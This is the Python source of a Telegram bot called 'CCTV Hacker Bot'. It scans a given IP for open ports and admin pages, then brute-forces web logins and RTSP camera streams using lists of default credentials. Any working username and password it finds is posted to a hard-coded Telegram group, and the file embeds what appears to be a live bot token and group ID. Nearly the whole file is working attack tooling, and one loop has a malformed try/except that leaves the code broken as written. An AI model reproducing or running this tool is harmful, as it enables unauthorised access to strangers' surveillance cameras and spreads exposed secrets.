import os
import asyncio
import socket
import logging
import re
import base64
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT = range(2)

# Common CCTV credentials dictionary
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Small dictionary for initial brute-forcing (expandable to 50,000 via file)
PASSWORD_DICT = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666",
    "password123", "adminadmin", "root", "qwerty", "letmein", "welcome",
    "camera", "security", "000000", "111111", "123123", "abc123", "pass123"
]

# Sample 500 combos for testing (expand to 50,000 in production)
BRUTE_COMBOS = [(u, p) for u in ["admin", "root", "user"] for p in PASSWORD_DICT + ["test" + str(i) for i in range(150)]]

# Expanded admin/login paths (50+)
ADMIN_PATHS = [
    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin",
    "/signup", "/auth", "/administrator", "/panel", "/manage", "/login.php",
    "/admin/login", "/user/login", "/secure", "/access", "/cpanel", "/adminpanel",
    "/login.html", "/sysadmin", "/webadmin", "/adminarea", "/backend", "/admin/login.php",
    "/admin/index.php", "/admin/console", "/admin_portal", "/admin_area", "/controlpanel",
    "/admin/control", "/admin/settings", "/admin/config", "/admin/users", "/admin/auth",
    "/login.asp", "/admin.asp", "/admin_login.php", "/admin/index", "/webpanel",
    "/admin-panel", "/admin_area/login", "/admin/dashboard", "/admin/secure",
    "/admin/web", "/admin/access", "/system/login", "/user/auth", "/manage/login",
    "/backend/login", "/secure/login"
]

# Common ports to scan for admin panels
COMMON_PORTS = [80, 443, 8080, 8443, 8000, 8008]

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation with a fancy welcome message and ask for IP address."""
    keyboard = [
        [InlineKeyboardButton("Start Hack", callback_data="start_hack")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 Welcome to CCTV Hacker Bot! 🚀\n"
        "I'm here to scan CCTV streams and admin panels securely. 😎\n"
        "Click 'Start Hack' to begin, use /checklink to verify a URL, or 'Help' for instructions!",
        reply_markup=reply_markup
    )
    return IP

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Start Hack button."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Please enter the IP address to hack (e.g., 192.168.1.1):")
    return IP

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Help button."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "📚 Help - CCTV Hacker Bot\n\n"
        "1. Use /start to begin scanning a CCTV or admin panel.\n"
        "2. Enter a valid IP and port (or leave blank to scan common ports).\n"
        "3. Use /checklink <url> to verify if a specific URL is an admin panel.\n"
        "4. Each detected panel will have buttons to check or brute-force credentials.\n"
        "5. Use 'Stop Brute-Force' to cancel a running scan.\n"
        "⚠️ Note: Use this bot ethically and legally!\n"
        "Use /status to check if I'm online."
    )

async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check if a provided URL is an admin panel and offer brute-force option."""
    if not context.args:
        await update.message.reply_text("Please provide a URL (e.g., /checklink http://192.168.8.20:80/login).")
        return

    url = context.args[0].strip()
    try:
        # Parse URL to extract IP, port, and path
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        path = parsed_url.path or "/"

        # Validate IP
        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
            await update.message.reply_text("Invalid IP address in URL! Please use a valid IPv4 address.")
            return

        # Check if port is open
        if not await check_port(ip, port):
            await update.message.reply_text(f"❌ Port {port} is closed or unreachable on {ip}.")
            return

        # Check if URL is an admin panel
        is_admin, details = await check_admin_panel(url)
        panel_name = path.strip("/") or "root"

        if is_admin:
            keyboard = [[InlineKeyboardButton(f"Brute-Force {panel_name}", callback_data=f"hunt_{ip}_{port}_{url}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"✅ **Detected Admin Panel**: {panel_name} 🎯\nURL: {url}\nDetails: {', '.join(details)}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            # Send to group chat
            try:
                await context.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"✅ **Detected Admin Panel** for {ip}:{port}!\nURL: {url}\nDetails: {', '.join(details)}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending to group: {e}")
                await update.message.reply_text(f"⚠️ Could not send to group chat: {str(e)}. Please add bot to group.")
            
            context.user_data["admin_pages"] = context.user_data.get("admin_pages", []) + [url]
        else:
            await update.message.reply_text(f"❌ No admin panel detected at {url}.\nDetails: {', '.join(details)}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error checking URL {url}: {str(e)}")

async def check_admin_panel(url: str) -> tuple[bool, list]:
    """Check if a URL is an admin panel."""
    details = []
    try:
        async with ClientSession() as session:
            async with session.get(url, timeout=5, ssl=False, allow_redirects=True) as response:
                status = response.status
                html = await response.text()
                headers = response.headers

                # Advanced admin panel detection
                is_admin = False

                # Check for login form
                if re.search(r'<form.*?(username|login|email|password).*?>', html, re.I | re.S):
                    is_admin = True
                    details.append("Login form detected")

                # Check keywords in HTML
                keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in"]
                if any(keyword in html.lower() for keyword in keywords):
                    is_admin = True
                    details.append("Admin keywords found")

                # Check headers for CMS/server signatures
                server = headers.get("Server", "").lower()
                powered_by = headers.get("X-Powered-By", "").lower()
                if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress", "joomla", "drupal"]):
                    details.append(f"Server: {server or powered_by}")

                # Status code analysis
                if status == 401:
                    details.append("Unauthorized (possible admin panel)")
                    is_admin = True
                elif status == 403:
                    details.append("Forbidden (possible protected panel)")
                    is_admin = True
                elif status != 200:
                    details.append(f"Status: {status}")

                return is_admin, details or ["No admin indicators found"]
    except Exception as e:
        return False, [f"Error: {str(e)}"]

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Store IP and ask for port."""
    ip = update.message.text
    # Basic IP validation
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
        await update.message.reply_text("Invalid IP address! Please enter a valid IPv4 address (e.g., 192.168.1.1).")
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("Got the IP! Now enter the port number (e.g., 80, 554) or leave blank to scan common ports:")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process IP and port, perform initial scan, check for login/admin pages, and show Hunt Password option."""
    ip = context.user_data.get("ip")
    port_input = update.message.text.strip()

    # Handle empty port input (scan common ports)
    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
            ports_to_scan = [port]
        except ValueError:
            await update.message.reply_text("Invalid port number! Please enter a number between 1 and 65535 or leave blank.")
            return PORT

    # Perform scan across ports
    results = []
    potential_links = []
    admin_pages = []
    inline_buttons = []

    for port in ports_to_scan:
        port_results, port_links, port_admin_pages = await hack_cctv(ip, port)
        results.append(port_results)
        potential_links.extend(port_links)
        admin_pages.extend(port_admin_pages)

        # Add inline buttons for each admin panel
        for admin_url in port_admin_pages:
            inline_buttons.append([
                InlineKeyboardButton(f"Check {admin_url}", url=admin_url),
                InlineKeyboardButton(f"Brute-Force {admin_url.split('/')[-1]}", callback_data=f"hunt_{ip}_{port}_{admin_url}")
            ])

    # Add general Hunt Password button if any links or admin pages found
    if potential_links or admin_pages:
        inline_buttons.append([InlineKeyboardButton("Hunt Password (All Panels)", callback_data=f"hunt_{ip}_{ports_to_scan[0]}")])

    reply_markup = InlineKeyboardMarkup(inline_buttons)
    results_text = "\n\n".join(results)
    await update.message.reply_text(results_text, reply_markup=reply_markup)

    # Send admin page links if detected
    if admin_pages:
        admin_message = "✅ **Detected Admin/Login Pages** 🎯:\n" + "\n".join([f"- {url}" for url in admin_pages])
        await update.message.reply_text(admin_message, parse_mode="Markdown")

    # Send results to group chat
    try:
        group_message = f"Hack Results for {ip}\n\n{results_text}"
        if admin_pages:
            group_message += "\n✅ **Detected Admin/Login Pages** 🎯:\n" + "\n".join([f"- {url}" for url in admin_pages])
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error sending to group: {e}")
        await update.message.reply_text(f"⚠️ Could not send to group chat: {str(e)}. Please add bot to group.")

    context.user_data["potential_links"] = potential_links
    context.user_data["admin_pages"] = admin_pages
    context.user_data["brute_force_running"] = False
    return ConversationHandler.END

async def hack_cctv(ip: str, port: int) -> tuple[str, list, list]:
    """Perform CCTV scan, check for login/admin pages with advanced detection, and return potential RTSP links."""
    results = [f"📡 Scanning {ip}:{port}..."]
    potential_links = []
    admin_pages = []

    # Check if port is open
    if not await check_port(ip, port):
        results.append("❌ Port closed or unreachable.")
        return "\n".join(results), potential_links, admin_pages

    results.append(f"✅ Port {port} is open on {ip}!")

    # Detect service
    service = "unknown"
    if port in [80, 8080, 8000, 8443, 443, 8008]:
        service = "http"
    elif port == 554:
        service = "rtsp"
    results.append(f"Service: {service}")

    # Try to detect camera model and login/admin pages via HTTP/HTTPS
    camera_model = "Unable to detect"
    open_paths = []
    if service == "http":
        protocols = ["http", "https"] if port in [443, 8443] else ["http"]
        for protocol in protocols:
            try:
                async with ClientSession() as session:
                    for path in ADMIN_PATHS:
                        url = f"{protocol}://{ip}:{port}{path}"
                        async with session.get(url, timeout=5, ssl=False, allow_redirects=True) as response:
                            status = response.status
                            html = await response.text()
                            headers = response.headers

                            # Advanced admin panel detection
                            is_admin = False
                            details = []

                            # Check for login form
                            if re.search(r'<form.*?(username|login|email|password).*?>', html, re.I | re.S):
                                is_admin = True
                                details.append("Login form detected")

                            # Check keywords in HTML
                            keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in"]
                            if any(keyword in html.lower() for keyword in keywords):
                                is_admin = True
                                details.append("Admin keywords found")

                            # Check headers for CMS/server signatures
                            server = headers.get("Server", "").lower()
                            powered_by = headers.get("X-Powered-By", "").lower()
                            if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress", "joomla", "drupal"]):
                                details.append(f"Server: {server or powered_by}")

                            # Status code analysis
                            if status == 401:
                                details.append("Unauthorized (possible admin panel)")
                                is_admin = True
                            elif status == 403:
                                details.append("Forbidden (possible protected panel)")
                                is_admin = True

                            if is_admin:
                                admin_pages.append(url)
                                results.append(f"✅ **Detected Admin/Login Page** 🎯: {url} ({', '.join(details)})")
                            else:
                                results.append(f"✅ Open Path: {url} (No admin/login page)")
                        except Exception as e:
                            results.append(f"❌ Path {url} (error: {str(e)})")
            except Exception as e:
                results.append(f"❌ Error checking {protocol} paths: {str(e)}")
        results.append(f"Open Paths Found: {len(open_paths)}/{len(ADMIN_PATHS)}")
    results.append(f"Camera Model: {camera_model}")

    # RTSP initial scan
    rtsp_results = []
    if service == "rtsp":
        for username, password in CREDENTIALS:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            is_valid, _ = await validate_rtsp(ip, port, username, password)
            if is_valid:
                rtsp_results.append(f"✅ RTSP Success: {username}:{password} (try {rtsp_url})")
                potential_links.append((rtsp_url, username, password))
            else:
                rtsp_results.append(f"❌ RTSP Failed: {username}:{password}")
        no_creds_url = f"rtsp://{ip}:{port}/live"
        is_valid, _ = await validate_rtsp(ip, port, "", "")
        if is_valid:
            rtsp_results.append(f"✅ RTSP Success: No credentials (try {no_creds_url})")
            potential_links.append((no_creds_url, "", ""))
        else:
            rtsp_results.append(f"❌ RTSP Failed: No credentials")
    results.extend(rtsp_results)

    # ONVIF check
    onvif_result = "Unable to detect ONVIF"
    if service == "http":
        try:
            async with ClientSession() as session:
                async with session.get(f"http://{ip}:{port}/onvif/device_service", timeout=5, ssl=False) as response:
                    if response.status == 200:
                        onvif_result = "✅ ONVIF Detected"
        except Exception:
            pass
    results.append(f"ONVIF: {onvif_result}")

    # Vulnerability note
    if potential_links or admin_pages:
        results.append(
            "⚠️ Vulnerability: Open port detected. Secure with strong authentication."
        )

    # Ethical disclaimer
    results.append("⚠️ Disclaimer: Use this tool ethically and legally. Unauthorized access is illegal.")

    # Final result
    if potential_links or admin_pages:
        results.append("🎉 Scan Successful! Check detected admin pages or use buttons to brute-force credentials!")
    else:
        results.append("❌ Scan Failed: No streams or admin pages found. Try another port or IP.")

    return "\n".join(results), potential_links, admin_pages

async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Hunt Password button, brute-force credentials with live progress for specific or all panels."""
    query = update.callback_query
    await query.answer()

    # Parse callback data
    data = query.data.split("_")
    ip = data[1]
    port = int(data[2])
    specific_url = data[3] if len(data) > 3 else None

    # Get potential links and admin pages
    potential_links = context.user_data.get("potential_links", [])
    admin_pages = context.user_data.get("admin_pages", []) if not specific_url else [specific_url]

    if not (potential_links or admin_pages):
        await query.message.reply_text("No RTSP links or admin pages to brute-force. Run /start or /checklink again.")
        return

    context.user_data["brute_force_running"] = True
    target = specific_url or f"{ip}:{port} (all panels)"
    await query.message.reply_text(f"🔥 Starting brute-force on {target} with {len(BRUTE_COMBOS)} combos...")

    # Initialize progress
    total_combos = len(BRUTE_COMBOS)
    checked = 0
    live_links = []
    progress_message = await query.message.reply_text(f"Progress: 0% (Checked {checked}/{total_combos} combos)")
    # Add Stop Brute-Force button
    keyboard = [[InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{specific_url or 'all'}")]]
    stop_button_message = await query.message.reply_text("Click below to stop brute-force:", reply_markup=InlineKeyboardMarkup(keyboard))

    # Brute-force admin pages (HTTP)
    if admin_pages:
        for admin_url in admin_pages:
            if not context.user_data.get("brute_force_running", False):
                break
            for username, password in BRUTE_COMBOS:
                if not context.user_data.get("brute_force_running", False):
                    break
                try:
                    async with ClientSession() as session:
                        async with session.post(
                            admin_url,
                            data={"username": username, "password": password},
                            timeout=5,
                            ssl=False,
                            allow_redirects=True
                        ) as response:
                            checked += 1
                            if response.status == 200:
                                html = await response.text()
                                if "login" not in html.lower() or any(keyword in html.lower() for keyword in ["dashboard", "admin", "welcome"]):
                                    live_links.append(admin_url)
                                    await query.message.reply_text(
                                        f"🎯 Found working creds!\nUsername: {username}\nPassword: {password}\nURL: {admin_url}",
                                        parse_mode="Markdown"
                                    )
                                    try:
                                        await context.bot.send_message(
                                            chat_id=GROUP_CHAT_ID,
                                            text=f"🎯 Found working creds for {ip}:{port}!\nUsername: {username}\nPassword: {password}\nURL: {admin_url}",
                                            parse_mode="Markdown"
                                        )
                                    except Exception as e:
                                        logger.error(f"Error sending to group: {e}")
                except Exception:
                    checked += 1

                # Update progress every 100 combos
                if checked % 100 == 0:
                    progress_percent = (checked / total_combos) * 100
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_message.chat_id,
                            message_id=progress_message.message_id,
                            text=f"Progress: {progress_percent:.0f}% (Checked {checked}/{total_combos} combos)"
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")

    # Brute-force RTSP links
    if potential_links and not specific_url:
        for rtsp_url, _, _ in potential_links:
            if not context.user_data.get("brute_force_running", False):
                break
            for username, password in BRUTE_COMBOS:
                if not context.user_data.get("brute_force_running", False):
                    break
                is_valid, error = await validate_rtsp(ip, port, username, password)
                checked += 1

                # Update progress every 100 combos
                if checked % 100 == 0:
                    progress_percent = (checked / total_combos) * 100
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_message.chat_id,
                            message_id=progress_message.message_id,
                            text=f"Progress: {progress_percent:.0f}% (Checked {checked}/{total_combos} combos)"
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")

                # If creds work, send immediately
                if is_valid:
                    new_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                    live_links.append(new_url)
                    await query.message.reply_text(
                        f"🎯 Found working creds!\nUsername: {username}\nPassword: {password}\nURL: {new_url}",
                        parse_mode="Markdown"
                    )
                    try:
                        await context.bot.send_message(
                            chat_id=GROUP_CHAT_ID,
                            text=f"🎯 Found working creds for {ip}:{port}!\nUsername: {username}\nPassword: {password}\nURL: {new_url}",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        logger.error(f"Error sending to group: {e}")

    # Final progress update
    if context.user_data.get("brute_force_running", False):
        await context.bot.edit_message_text(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id,
            text=f"✅ Brute-force complete! Checked {checked}/{total_combos} combos"
        )
    else:
        await context.bot.edit_message_text(
            chat_id=progress_message.chat_id,
            message_id=progress_message.message_id,
            text=f"🛑 Brute-force stopped! Checked {checked}/{total_combos} combos"
        )

    # Remove Stop Brute-Force button
    try:
        await context.bot.edit_message_text(
            chat_id=stop_button_message.chat_id,
            message_id=stop_button_message.message_id,
            text="Brute-force finished or stopped.",
            reply_markup=None
        )
    except Exception as e:
        logger.error(f"Error removing stop button: {e}")

    # Final results
    if live_links:
        await query.message.reply_text(
            f"🎉 Brute-force Successful! Found {len(live_links)} live links:\n" + "\n".join(live_links),
            parse_mode="Markdown"
        )
    else:
        await query.message.reply_text("❌ No new live links found. Try another IP/port.")

    context.user_data["brute_force_running"] = False

async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Stop Brute-Force button."""
    query = update.callback_query
    await query.answer()
    context.user_data["brute_force_running"] = False
    await query.message.reply_text("🛑 Brute-force stopped! Check the progress message for details.")

async def check_port(ip: str, port: int) -> bool:
    """Check if a port is open using socket."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    """Validate RTSP credentials by sending a DESCRIBE request."""
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        # Construct RTSP DESCRIBE request
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\n"
        request += f"CSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        
        # Send request
        writer.write(request.encode('ascii'))
        await writer.drain()

        # Read response
        response = await asyncio.wait_for(reader.read(1024), timeout=5)
        response_str = response.decode('ascii', errors='ignore')

        # Check for 200 OK
        if "RTSP/1.0 200 OK" in response_str:
            writer.close()
            await writer.wait_closed()
            return True, "Success"
        elif "401 Unauthorized" in response_str:
            writer.close()
            await writer.wait_closed()
            return False, "Authentication failed"
        else:
            writer.close()
            await writer.wait_closed()
            return False, f"Unexpected response: {response_str[:50]}"

    except asyncio.TimeoutError:
        return False, "Connection timeout"
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text("Hack cancelled. Use /start to try again.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check bot status."""
    await update.message.reply_text("Bot is running! Use /start or /checklink to hack a CCTV.")

async def keep_alive():
    """Keep-alive server to prevent Koyeb from shutting down."""
    import http.server
    import socketserver

    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()

    server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
    logger.info(f"Keep-alive server running on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

def run_keep_alive(loop):
    """Run keep_alive in an async event loop."""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(keep_alive())

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            IP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                CallbackQueryHandler(help_callback, pattern="^help$"),
            ],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("checklink", check_link))
    application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
    application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))

    # Start keep-alive server in a separate thread with its own event loop
    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
